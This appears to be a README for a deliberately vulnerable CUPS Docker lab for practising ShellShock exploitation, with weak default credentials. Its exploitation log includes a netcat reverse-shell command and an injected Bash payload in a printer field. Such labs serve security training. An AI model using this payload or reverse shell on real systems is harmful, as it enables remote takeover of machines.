### What is it?

This is a docker image containing a CUPS server vulnerable to the well-known ShellShock vulnerability.

CVE-2014-6271 CVE-2014-6278

The docker image sets a user account called 'admin' whose password is 'hello'.

Exploitation is possible with:

- the [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/cups_bash_env_exec.rb)
- the [Python based exploit](https://github.com/devl00p/exploits/blob/main/devloop-cups-shellshock.py) I made.

The docker image also contains netcat.

Exploitation example:

```console
$ python devloop-cups-shellshock.py -v -U admin -P hello -c "nc -e /bin/bash 192.168.1.43 9999" -p 6311 127.0.0.1
[*] Attempting to exploit CVE-2014-6271 on http://127.0.0.1:6311
[*] Checking CUPS and credentials...
[*] (VERBOSE) Adding new printer 'YV9B9w0rQcao' with payload in PRINTER_LOCATION
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'add-printer', 'PRINTER_NAME': 'YV9B9w0rQcao', 'PRINTER_INFO': '', 'PRINTER_LOCATION': 'Checking...', 'DEVICE_URI': 'file:///dev/null'}
[*] (VERBOSE) Files: ['PPD_FILE']
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[*] Found CUPS server: CUPS/1.5
[+] Successfully added dummy printer 'YV9B9w0rQcao' for check.
[*] (VERBOSE) Deleting printer 'YV9B9w0rQcao'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'delete-printer', 'printer_name': 'YV9B9w0rQcao', 'confirm': 'Delete Printer'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Successfully deleted dummy printer 'YV9B9w0rQcao'.
[*] Adding printer 'pwned-ybsOG8NX' with payload...
[*] (VERBOSE) Adding new printer 'pwned-ybsOG8NX' with payload in PRINTER_LOCATION
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'add-printer', 'PRINTER_NAME': 'pwned-ybsOG8NX', 'PRINTER_INFO': '', 'PRINTER_LOCATION': '() { :;}; $(nc -e /bin/bash 192.168.1.43 9999) &', 'DEVICE_URI': 'file:///dev/null'}
[*] (VERBOSE) Files: ['PPD_FILE']
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Printer 'pwned-ybsOG8NX' added successfully.
[*] Printing test page to trigger payload...
[*] (VERBOSE) Adding test page to printer queue for 'pwned-ybsOG8NX'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/printers/pwned-ybsOG8NX
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'print-test-page'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Test page submitted. Payload should have executed (check listener or target).
[*] The payload executes asynchronously. This script does not confirm execution success.
[*] Cleaning up: deleting printer 'pwned-ybsOG8NX'...
[*] (VERBOSE) Deleting printer 'pwned-ybsOG8NX'
[*] (VERBOSE) Sending POST request to http://127.0.0.1:6311/admin/
[*] (VERBOSE) POST Data: {'org.cups.sid': 'QxsG081GaJjCy9O9', 'OP': 'delete-printer', 'printer_name': 'pwned-ybsOG8NX', 'confirm': 'Delete Printer'}
[*] (VERBOSE) Response Status: 200
[*] (VERBOSE) Response Headers: {'Date': 'Fri, 06 Jun 2025 07:38:48 GMT', 'Server': 'CUPS/1.5', 'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=30', 'Content-Language': 'en_US', 'Transfer-Encoding': 'chunked', 'Content-Type': 'text/html;charset=utf-8'}
[+] Printer 'pwned-ybsOG8NX' deleted successfully.
[*] Exploit attempt finished.
```
